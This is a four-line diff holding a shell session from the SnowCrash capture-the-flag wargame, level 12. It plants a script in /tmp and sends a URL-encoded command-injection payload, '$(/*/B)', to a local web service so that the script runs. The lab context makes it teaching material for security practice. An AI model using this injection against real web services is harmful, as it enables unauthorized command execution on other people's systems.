@@ -1,0 +1,4 @@
+level12@SnowCrash:~$ echo "getflag>/tmp/H" > /tmp/B
+level12@SnowCrash:~$ chmod 777 /tmp/B
+level12@SnowCrash:~$ curl "localhost:4646?x=%24%28%2F%2A%2FB%29"
+
